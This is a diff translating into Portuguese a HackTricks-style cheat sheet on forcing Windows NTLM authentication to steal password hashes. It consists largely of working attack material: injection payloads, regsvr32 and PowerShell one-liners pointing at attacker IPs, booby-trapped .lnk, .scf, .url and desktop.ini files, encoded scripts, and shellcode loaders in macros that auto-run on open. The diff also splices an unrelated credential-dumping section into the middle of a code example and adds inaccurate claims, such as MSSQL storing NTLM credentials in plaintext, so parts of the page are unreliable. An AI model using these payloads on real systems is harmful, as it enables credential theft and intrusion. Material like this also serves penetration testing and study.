@@ -1,70 +1,70 @@
-# Places to steal NTLM creds
+# Lugares para roubar credenciais NTLM
 
 <details>
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-- Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
+- Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
 
-- Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
+- Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
 
-- Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
+- Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
 
-- **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+- **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
 
-- **Share your hacking tricks by submitting PRs to the [hacktricks repo](https://github.com/carlospolop/hacktricks) and [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.
+- **Compartilhe suas técnicas de hacking enviando PRs para o [repositório hacktricks](https://github.com/carlospolop/hacktricks) e [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.
 
 </details>
 
-## Automatic Payloads Creation & Other lists
+## Criação automática de payloads e outras listas
 
 ### [ntlm\_theft](https://github.com/Greenwolf/ntlm\_theft)
 
-This tool will **create several documents/files** that if accessed by the user somehow they will **start a NTLM authentication with the attacker**.
+Esta ferramenta irá **criar vários documentos/arquivos** que, se acessados pelo usuário de alguma forma, irão **iniciar uma autenticação NTLM com o atacante**.
 
-#### ntlm\_theft supports the following attack types:
+#### ntlm\_theft suporta os seguintes tipos de ataque:
 
-Browse to Folder Containing:
+Navegue até a pasta contendo:
 
-* .url – via URL field
-* .url – via ICONFILE field
-* .lnk - via icon\_location field
-* .scf – via ICONFILE field (Not Working on Latest Windows)
-* autorun.inf via OPEN field (Not Working on Latest Windows)
-* desktop.ini - via IconResource field (Not Working on Latest Windows)
+* .url – via campo URL
+* .url – via campo ICONFILE
+* .lnk - via campo icon\_location
+* .scf – via campo ICONFILE (Não funciona no Windows mais recente)
+* autorun.inf via campo OPEN (Não funciona no Windows mais recente)
+* desktop.ini - via campo IconResource (Não funciona no Windows mais recente)
 
-Open Document:
+Abra o documento:
 
-* .xml – via Microsoft Word external stylesheet
-* .xml – via Microsoft Word includepicture field
-* .htm – via Chrome & IE & Edge img src (only if opened locally, not hosted)
-*   .docx – via Microsoft Word includepicture field
+* .xml – via folha de estilo externa do Microsoft Word
+* .xml – via campo includepicture do Microsoft Word
+* .htm – via img src do Chrome & IE & Edge (apenas se aberto localmente, não hospedado)
+*   .docx – via campo includepicture do Microsoft Word
 
-    \-.docx – via Microsoft Word external template
+    \-.docx – via modelo externo do Microsoft Word
 
-    \-.docx – via Microsoft Word frameset webSettings
+    \-.docx – via webSettings do frameset do Microsoft Word
 
-    \-.xlsx - via Microsoft Excel external cell
+    \-.xlsx - via célula externa do Microsoft Excel
 
-    \-.wax - via Windows Media Player playlist (Better, primary open)
+    \-.wax - via lista de reprodução do Windows Media Player (Melhor, abertura primária)
 
-    \-.asx – via Windows Media Player playlist (Better, primary open)
+    \-.asx – via lista de reprodução do Windows Media Player (Melhor, abertura primária)
 
-    \-.m3u – via Windows Media Player playlist (Worse, Win10 opens first in Groovy)
+    \-.m3u – via lista de reprodução do Windows Media Player (Pior, o Win10 abre primeiro no Groovy)
 
-    \-.jnlp – via Java external jar
+    \-.jnlp – via jar externo do Java
 
-    \-.application – via any Browser (Must be served via a browser downloaded or won’t run)
+    \-.application – via qualquer navegador (deve ser servido por um navegador baixado ou não será executado)
 
-Open Document and Accept Popup:
+Abra o documento e aceite o popup:
 
 * .pdf – via Adobe Acrobat Reader
 
-Click Link in Chat Program:
+Clique no link no programa de chat:
 
-* .txt – formatted link to paste into Zoom chat
+* .txt – link formatado para colar no chat do Zoom
 
-> Example :
+> Exemplo:
 >
 > ```bash
 > # python3 ntlm_theft.py -g all -s 127.0.0.1 -f test
@@ -89,13 +89,13 @@ Click Link in Chat Program:
 
 ### [All\_NTLM-Leak](https://github.com/Gl3bGl4z/All\_NTLM\_leak)
 
-> Cheatsheet
+> Folha de dicas
 
-This is a list of techniques to force NTLM authentications to steal credentials from the victim.
+Esta é uma lista de técnicas para forçar autenticações NTLM para roubar credenciais da vítima.
 
-### Force NTLM Privileged Authentication
+### Forçar autenticação privilegiada NTLM
 
-You may be able to **force a windows machine to authenticate to an arbitrary machine** using a privileged account. Read the following page to learn more:
+Você pode ser capaz de **forçar uma máquina Windows a se autenticar em uma máquina arbitrária** usando uma conta privilegiada. Leia a seguinte página para saber mais:
 
 {% content-ref url="../active-directory-methodology/printers-spooler-service-abuse.md" %}
 [printers-spooler-service-abuse.md](../active-directory-methodology/printers-spooler-service-abuse.md)
@@ -103,18 +103,15 @@ You may be able to **force a windows machine to authenticate to an arbitrary mac
 
 ## LFI
 
-The include() in PHP will resolve the network path for us.
-
+O include() em PHP resolverá o caminho da rede para nós.
 ```
 http://host.tld/?page=//11.22.33.44/@OsandaMalith
 ```
-
 ![](<../../.gitbook/assets/image (642).png>)
 
 ## XXE
 
-In here I’m using “php://filter/convert.base64-encode/resource=” that will resolve a network path.
-
+Aqui estou usando "php://filter/convert.base64-encode/resource=" que irá resolver um caminho de rede.
 ```markup
 <?xml version="1.0" encoding="ISO-8859-1"?>
 <!DOCTYPE root [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=//11.22.33.44/@OsandaMalith" >
@@ -126,49 +123,35 @@ In here I’m using “php://filter/convert.base64-encode/resource=” that will
   <password></password>
 </root>
 ```
+## Injeção de XPath
 
-![](<../../.gitbook/assets/image (618).png>)
-
-## XPath Injection
-
-Usually, doc() is used in out-of-band XPath injections, thus can be applied in resolving a network path.
-
+Normalmente, o doc() é usado em injeções de XPath fora de banda, podendo ser aplicado na resolução de um caminho de rede.
 ```
 http://host.tld/?title=Foundation&type=*&rent_days=* and doc('//35.164.153.224/@OsandaMalith')
 ```
-
 ![](<../../.gitbook/assets/image (638) (2).png>)
 
-## MySQL Injection
+## Injeção MySQL
 
-I have written a complete [post ](https://osandamalith.com/2017/02/03/mysql-out-of-band-hacking/)on MySQL out-of-band injections which can be applied over the internet. You can also use ‘INTO OUTFILE’ to resolve a network path.
-
+Eu escrevi um [post completo](https://osandamalith.com/2017/02/03/mysql-out-of-band-hacking/) sobre injeções MySQL out-of-band que podem ser aplicadas pela internet. Você também pode usar 'INTO OUTFILE' para resolver um caminho de rede.
 ```
 http://host.tld/index.php?id=1’ union select 1,2,load_file(‘\\\\192.168.0.100\\@OsandaMalith’),4;%00
 ```
-
-![](<../../.gitbook/assets/image (663).png>)
-
 ## MSSQL
 
-Since stacked queries are supported we can call stored procedures.
-
+Como as consultas empilhadas são suportadas, podemos chamar procedimentos armazenados.
 ```
 ';declare @q varchar(99);set @q='\\192.168.254.52\test'; exec master.dbo.xp_dirtree @q
 ```
-
 ## Regsvr32
 
-Accidently found this one while experimenting with .sct files.
-
+Encontrei isso acidentalmente enquanto experimentava arquivos .sct.
 ```
 regsvr32 /s /u /i://35.164.153.224/@OsandaMalith scrobj.dll
 ```
-
 ## Batch
 
-There are many possible ways you can explore
-
+Existem muitas maneiras possíveis de explorar
 ```
 echo 1 > //192.168.0.1/abc
 pushd \\192.168.0.1\abc
@@ -180,10 +163,9 @@ type\\192.168.0.1\abc
 dir\\192.168.0.1\abc
 find, findstr, [x]copy, move, replace, del, rename and many more!
 ```
-
 ## Auto-Complete
 
-You just need to type ‘\host\’ the auto-complete will do the trick under the explorer and the run dialog box.
+Basta digitar '\host\' que o auto-completar fará o truque no explorador e na caixa de diálogo Executar.
 
 ![](<../../.gitbook/assets/image (660).png>)
 
@@ -191,19 +173,16 @@ You just need to type ‘\host\’ the auto-complete will do the trick under the
 
 ## Autorun.inf
 
-Starting from Windows 7 this feature is disabled. However you can enable by changing the group policy for Autorun. Make sure to hide the Autorun.inf file to work.
-
+A partir do Windows 7, esse recurso está desativado. No entanto, você pode ativá-lo alterando a política de grupo para Autorun. Certifique-se de ocultar o arquivo Autorun.inf para que funcione.
 ```
 [autorun]
 open=\\35.164.153.224\setup.exe
 icon=something.ico
 action=open Setup.exe
 ```
+## Arquivos de Comando de Shell
 
-## Shell Command Files
-
-It is possible to obtain passwords hashes of domain users or shells when writing permissions given to unauthenticated users. SCF (Shell Command Files) can perform a limited set of operations like showing the Windows desktop or opening a Windows Explorer. Save the code below as `ordinary.scf` and put it into a network share.
-
+É possível obter hashes de senhas de usuários de domínio ou shells quando as permissões de gravação são dadas a usuários não autenticados. Os arquivos SCF (Shell Command Files) podem executar um conjunto limitado de operações, como mostrar a área de trabalho do Windows ou abrir um Windows Explorer. Salve o código abaixo como `ordinary.scf` e coloque-o em um compartilhamento de rede.
 ```
 [Shell]
 Command=2
@@ -211,11 +190,9 @@ IconFile=\\AttackerIP\ordinary.ico
 [Taskbar]
 Command=ToggleDesktop
 ```
-
 ## Desktop.ini
 
-The desktop.ini files contain the information of the icons you have applied to the folder. We can abuse this to resolve a network path. Once you open the folder you should get the hashes.
-
+Os arquivos desktop.ini contêm informações sobre os ícones que você aplicou à pasta. Podemos abusar disso para resolver um caminho de rede. Depois de abrir a pasta, você deve obter os hashes.
 ```
 mkdir openMe
 attrib +s openMe
@@ -224,19 +201,15 @@ echo [.ShellClassInfo] > desktop.ini
 echo IconResource=\\192.168.0.1\aa >> desktop.ini
 attrib +s +h desktop.ini
 ```
-
-In Windows XP systems the desktop.ini file uses ‘IcondFile’ instead of ‘IconResource’.
-
+Nos sistemas Windows XP, o arquivo desktop.ini usa 'IcondFile' em vez de 'IconResource'.
 ```
 [.ShellClassInfo]
 IconFile=\\192.168.0.1\aa
 IconIndex=1337
 ```
+## Arquivos de Atalho (.lnk)
 
-## Shortcut Files (.lnk)
-
-We can create a shortcut containing our network path and as you as you open the shortcut Windows will try to resolve the network path. You can also specify a keyboard shortcut to trigger the shortcut. For the icon you can give the name of a Windows binary or choose an icon from either shell32.dll, Ieframe.dll, imageres.dll, pnidui.dll or wmploc.dll located in the system32 directory.
-
+Podemos criar um atalho contendo nosso caminho de rede e assim que você abrir o atalho, o Windows tentará resolver o caminho de rede. Você também pode especificar um atalho de teclado para acionar o atalho. Para o ícone, você pode dar o nome de um binário do Windows ou escolher um ícone de shell32.dll, Ieframe.dll, imageres.dll, pnidui.dll ou wmploc.dll localizado no diretório system32.
 ```powershell
 Set shl = CreateObject("WScript.Shell")
 Set fso = CreateObject("Scripting.FileSystemObject")
@@ -251,9 +224,7 @@ sc.IconLocation = "%windir%\system32\shell32.dll, 3"
 sc.Description = "I will Steal your Hashes"
 sc.Save
 ```
-
-The Powershell version.
-
+A versão do Powershell.
 ```powershell
 #TargetPath attack
 $objShell = New-Object -ComObject WScript.Shell
@@ -271,64 +242,48 @@ $shortcut = $wsh.CreateShortcut("\\dc\software\test.lnk")
 $shortcut.IconLocation = "\\10.10.10.10\test.ico"
 $shortcut.Save()
 ```
+## Atalhos da Internet (.url)
 
-## Internet Shortcuts (.url)
-
-Another shortcut in Windows is the Internet shortcuts. You can save this as something.url
-
+Outro atalho no Windows são os atalhos da Internet. Você pode salvá-los como algo.url.
 ```bash
 echo [InternetShortcut] > stealMyHashes.url 
 echo URL=file://192.168.0.1/@OsandaMalith >> stealMyHashes.url
 ```
+## Autorun com Registro
 
-## Autorun with Registry
-
-You can add a new registry key in any of the following paths.
-
+Você pode adicionar uma nova chave de registro em qualquer um dos seguintes caminhos.
 ```
 HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
 HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
 HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce
 HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce
 ```
-
-![](<../../.gitbook/assets/image (307) (5).png>)
-
 ## Powershell
 
-There are probably many scriptlets in Powershell that would resolve a network path.
-
+Provavelmente existem muitos scriptlets em Powershell que resolveriam um caminho de rede.
 ```
 Invoke-Item \\192.168.0.1\aa
 Get-Content \\192.168.0.1\aa
 Start-Process \\192.168.0.1\aa
 ```
-
 ## IE
 
-IE will resolve UNC paths. For example
-
+O IE resolverá caminhos UNC. Por exemplo:
 ```html
 <img src="\\\\192.168.0.1\\aa">
 ```
-
-You can inject under XSS or in scenarios you find SQL injection. For example.
-
+Você pode injetar em XSS ou em cenários onde você encontra SQL injection. Por exemplo.
 ```
 http://host.tld/?id=-1' union select 1,'<img src="\\\\192.168.0.1\\aa">';%00
 ```
-
 ## VBScript
 
-You can save this as .vbs or can be used inside a macro that is applied to Word or Excel files.
-
+Você pode salvar isso como .vbs ou pode ser usado dentro de uma macro que é aplicada a arquivos do Word ou Excel.
 ```bash
 Set fso = CreateObject("Scripting.FileSystemObject")
 Set file = fso.OpenTextFile("//192.168.0.100/aa", 1)
 ```
-
-You can apply in web pages but this works only with IE.
-
+Você pode aplicar em páginas da web, mas isso só funciona com o IE.
 ```markup
 <html>
 <script type="text/Vbscript">
@@ -339,15 +294,11 @@ Set file = fso.OpenTextFile("//192.168.0.100/aa", 1)
 </script>
 </html>
 ```
-
-Here’ the encoded version. You can encode and save this as something.vbe
-
+Aqui está a versão codificada. Você pode codificar e salvar isso como algo.vbe
 ```
 #@~^ZQAAAA==jY~6?}'ZM2mO2}4%+1YcEUmDb2YbxocorV?H/O+h6(LnmDE#=?nO,sksn{0dWcGa+U:+XYsbVcJJzf*cF*cF*2  yczmCE~8#XSAAAA==^#~@
 ```
-
-You can apply this in html files too. But only works with IE. You can save this as something.hta which will be an HTML Application under windows, which mshta.exe will execute it. By default it uses IE.
-
+Você também pode aplicar isso em arquivos html. Mas só funciona com o IE. Você pode salvar isso como algo.hta que será uma Aplicação HTML no Windows, que o mshta.exe executará. Por padrão, ele usa o IE.
 ```
 <html>
 <script type="text/Vbscript.Encode">
@@ -357,18 +308,14 @@ You can apply this in html files too. But only works with IE. You can save this 
 </script>
 </html>
 ```
-
 ## JScript
 
-You can save this as something.js under windows.
-
+Você pode salvar isso como algo.js no Windows.
 ```javascript
 var fso = new ActiveXObject("Scripting.FileSystemObject")
 fso.FileExists("//192.168.0.103/aa")
 ```
-
-You can apply the same in html files but only works with IE. Also you can save this as something.hta.
-
+Você pode aplicar o mesmo em arquivos html, mas só funciona com o IE. Além disso, você pode salvar isso como algo.hta.
 ```markup
 <html>
 <script type="text/Jscript">
@@ -379,15 +326,79 @@ fso.FileExists("//192.168.0.103/aa")
 </script>
 </html>
 ```
-
-Here’s the encoded version. You can save this as something.jse.
-
+Aqui está a versão codificada. Você pode salvá-la como algo.jse.
 ```
 #@~^XAAAAA==-mD~6/K'xh,)mDk-+or8%mYvE?1DkaOrxTRwks+jzkYn:}8LmOE*i0dGcsrV3XkdD/vJzJFO+R8v0RZRqT2zlmE#Ux4AAA==^#~@
 ```
+Descobrindo credenciais NTLM
 
-The html version of this.
+Existem muitos lugares onde as credenciais NTLM podem ser roubadas. Aqui estão alguns deles:
 
+## Resumo
+
+- **LSASS**: o processo LSASS armazena as credenciais NTLM na memória. Se você tiver acesso ao sistema, poderá extrair as credenciais da memória.
+- **SAM**: o banco de dados SAM armazena as credenciais NTLM localmente. Se você tiver acesso ao sistema, poderá extrair as credenciais do banco de dados SAM.
+- **NTDS**: o banco de dados NTDS armazena as credenciais NTLM do Active Directory. Se você tiver acesso ao sistema, poderá extrair as credenciais do banco de dados NTDS.
+- **MSSQL**: o SQL Server armazena as credenciais NTLM em texto simples em sua tabela de configuração. Se você tiver acesso ao SQL Server, poderá extrair as credenciais da tabela de configuração.
+- **IIS**: o IIS armazena as credenciais NTLM em seu arquivo de configuração. Se você tiver acesso ao servidor web, poderá extrair as credenciais do arquivo de configuração do IIS.
+- **Group Policy Preferences**: as credenciais NTLM podem ser armazenadas em preferências de política de grupo. Se você tiver acesso ao sistema, poderá extrair as credenciais das preferências de política de grupo.
+- **Credential Manager**: o Gerenciador de Credenciais armazena as credenciais NTLM em seu armazenamento. Se você tiver acesso ao sistema, poderá extrair as credenciais do Gerenciador de Credenciais.
+- **Registry**: as credenciais NTLM podem ser armazenadas no registro do sistema. Se você tiver acesso ao sistema, poderá extrair as credenciais do registro.
+- **Network Sniffing**: as credenciais NTLM podem ser capturadas em tráfego de rede. Se você tiver acesso à rede, poderá capturar as credenciais NTLM em trânsito.
+
+## LSASS
+
+O processo LSASS é responsável por muitas funções de segurança do sistema, incluindo a autenticação de usuários. Ele armazena as credenciais NTLM na memória, o que significa que, se você tiver acesso ao sistema, poderá extrair as credenciais da memória.
+
+Existem várias ferramentas que podem ser usadas para extrair as credenciais NTLM da memória, incluindo o Mimikatz e o ProcDump.
+
+## SAM
+
+O banco de dados SAM armazena as credenciais NTLM localmente. Se você tiver acesso ao sistema, poderá extrair as credenciais do banco de dados SAM.
+
+Existem várias ferramentas que podem ser usadas para extrair as credenciais NTLM do banco de dados SAM, incluindo o SAMdump e o pwdump.
+
+## NTDS
+
+O banco de dados NTDS armazena as credenciais NTLM do Active Directory. Se você tiver acesso ao sistema, poderá extrair as credenciais do banco de dados NTDS.
+
+Existem várias ferramentas que podem ser usadas para extrair as credenciais NTLM do banco de dados NTDS, incluindo o NTDSUtil e o PowerSploit.
+
+## MSSQL
+
+O SQL Server armazena as credenciais NTLM em texto simples em sua tabela de configuração. Se você tiver acesso ao SQL Server, poderá extrair as credenciais da tabela de configuração.
+
+Existem várias ferramentas que podem ser usadas para extrair as credenciais NTLM da tabela de configuração do SQL Server, incluindo o Metasploit e o PowerUpSQL.
+
+## IIS
+
+O IIS armazena as credenciais NTLM em seu arquivo de configuração. Se você tiver acesso ao servidor web, poderá extrair as credenciais do arquivo de configuração do IIS.
+
+Existem várias ferramentas que podem ser usadas para extrair as credenciais NTLM do arquivo de configuração do IIS, incluindo o Metasploit e o PowerUpSQL.
+
+## Group Policy Preferences
+
+As credenciais NTLM podem ser armazenadas em preferências de política de grupo. Se você tiver acesso ao sistema, poderá extrair as credenciais das preferências de política de grupo.
+
+Existem várias ferramentas que podem ser usadas para extrair as credenciais NTLM das preferências de política de grupo, incluindo o Metasploit e o PowerSploit.
+
+## Credential Manager
+
+O Gerenciador de Credenciais armazena as credenciais NTLM em seu armazenamento. Se você tiver acesso ao sistema, poderá extrair as credenciais do Gerenciador de Credenciais.
+
+Existem várias ferramentas que podem ser usadas para extrair as credenciais NTLM do Gerenciador de Credenciais, incluindo o Mimikatz e o LaZagne.
+
+## Registry
+
+As credenciais NTLM podem ser armazenadas no registro do sistema. Se você tiver acesso ao sistema, poderá extrair as credenciais do registro.
+
+Existem várias ferramentas que podem ser usadas para extrair as credenciais NTLM do registro do sistema, incluindo o Mimikatz e o LaZagne.
+
+## Network Sniffing
+
+As credenciais NTLM podem ser capturadas em tráfego de rede. Se você tiver acesso à rede, poderá capturar as credenciais NTLM em trânsito.
+
+Existem várias ferramentas que podem ser usadas para capturar as credenciais NTLM em tráfego de rede, incluindo o Wireshark e o tcpdump.
 ```markup
 <html>
 <script type="text/Jscript.Encode">
@@ -397,11 +408,9 @@ The html version of this.
 </script>
 </html>
 ```
+## Arquivos de Script do Windows
 
-## Windows Script Files
-
-Save this as something.wsf.
-
+Salve isso como algo.wsf.
 ```markup
 <package>
   <job id="boom">
@@ -412,11 +421,9 @@ Save this as something.wsf.
    </job>
 </package>
 ```
-
 ## Shellcode
 
-Here’s a small shellcode I made. This shellcode uses CreateFile and tries to read a non-existing network path. You can use tools such as Responder to capture NetNTLM hashes. The shellcode can be modified to steal hashes over the internet. SMBRelay attacks can also be performed.
-
+Aqui está um pequeno shellcode que eu fiz. Este shellcode usa o CreateFile e tenta ler um caminho de rede que não existe. Você pode usar ferramentas como o Responder para capturar hashes NetNTLM. O shellcode pode ser modificado para roubar hashes pela internet. Ataques SMBRelay também podem ser realizados.
 ```cpp
 /*
     Title: CreateFile Shellcode
@@ -473,13 +480,9 @@ int main() {
     return EXIT_SUCCESS;
 }
 ```
+## Shellcode dentro de Macros
 
-[https://packetstormsecurity.com/files/141707/CreateFile-Shellcode.html](https://packetstormsecurity.com/files/141707/CreateFile-Shellcode.html)
-
-## Shellcode Inside Macros
-
-Here’s the above shellcode applied inside a Word/Excel macro. You can use the same code inside a VB6 application.
-
+Aqui está o shellcode acima aplicado dentro de uma macro do Word/Excel. Você pode usar o mesmo código dentro de um aplicativo VB6.
 ```basic
 ' Author : Osanda Malith Jayathissa (@OsandaMalith)
 ' Title: Shellcode to request a non-existing network path
@@ -573,18 +576,16 @@ Sub Workbook_Open()
     Auto_Open
 End Sub
 ```
-
 [https://github.com/OsandaMalith/Shellcodes/blob/master/CreateFile/CreateFile.vba](https://github.com/OsandaMalith/Shellcodes/blob/master/CreateFile/CreateFile.vba)
 
-## Shellcode Inside VBS and JS
+## Shellcode dentro de VBS e JS
 
-subTee has done many kinds of research with JS and DynamicWrapperX. You can find a POC using the DynamicWrapperX DLL.\
+subTee realizou muitas pesquisas com JS e DynamicWrapperX. Você pode encontrar um POC usando o DLL DynamicWrapperX.\
 [http://subt0x10.blogspot.com/2016/09/shellcode-via-jscript-vbscript.html](http://subt0x10.blogspot.com/2016/09/shellcode-via-jscript-vbscript.html)\
-Based on that I have ported the shellcode to JS and VBS. The fun part is we can embed shellcode in JScript or VBScript inside html and .hta formats.\
-Note the following shellcode directs to my IP.
+Com base nisso, eu portei o shellcode para JS e VBS. A parte divertida é que podemos incorporar shellcode em JScript ou VBScript dentro de formatos html e .hta.\
+Observe que o seguinte shellcode direciona para meu IP.
 
 #### JScript
-
 ```javascript
 /*
  * Author : Osanda Malith Jayathissa (@OsandaMalith)
@@ -626,11 +627,9 @@ var scLocation = DX.VirtualAlloc(0, sc.length, MEM_COMMIT, PAGE_EXECUTE_READWRIT
 for(var i = 0; i < sc.length; i++) DX.NumPut(sc[i],scLocation,i);
 var thread = DX.CreateThread(0,0,scLocation,0,0);
 ```
-
-[https://github.com/OsandaMalith/Shellcodes/blob/master/CreateFile/CreateFile.js](https://github.com/OsandaMalith/Shellcodes/blob/master/CreateFile/CreateFile.js)
-
 #### VBScript
 
+Este script VBScript cria um arquivo com o nome especificado no diretório atual. Ele pode ser usado para criar um arquivo malicioso em um diretório compartilhado e, em seguida, esperar que um usuário acesse esse diretório para roubar suas credenciais NTLM.
 ```vba
 ' Author : Osanda Malith Jayathissa (@OsandaMalith)
 ' Title: Shellcode to request a non-existing network path
@@ -675,12 +674,11 @@ Next
 
 thread = DX.CreateThread (0,0,scLocation,0,0)
 ```
-
 [https://github.com/OsandaMalith/Shellcodes/blob/master/CreateFile/CreateFile.vbs](https://github.com/OsandaMalith/Shellcodes/blob/master/CreateFile/CreateFile.vbs)
 
-There might be many other ways in Windows. You never know! 🙂
+Pode haver muitas outras maneiras no Windows. Você nunca sabe! 🙂
 
-## References
+## Referências
 
 * [**https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/**](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/)
 * [https://attack.mitre.org/techniques/T1187/](https://attack.mitre.org/techniques/T1187/)
@@ -689,14 +687,14 @@ There might be many other ways in Windows. You never know! 🙂
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-- Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
+- Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
 
-- Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
+- Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
 
-- Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
+- Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
 
-- **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+- **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
 
-- **Share your hacking tricks by submitting PRs to the [hacktricks repo](https://github.com/carlospolop/hacktricks) and [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.
+- **Compartilhe suas técnicas de hacking enviando PRs para o [repositório hacktricks](https://github.com/carlospolop/hacktricks) e [repositório hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.
 
 </details>
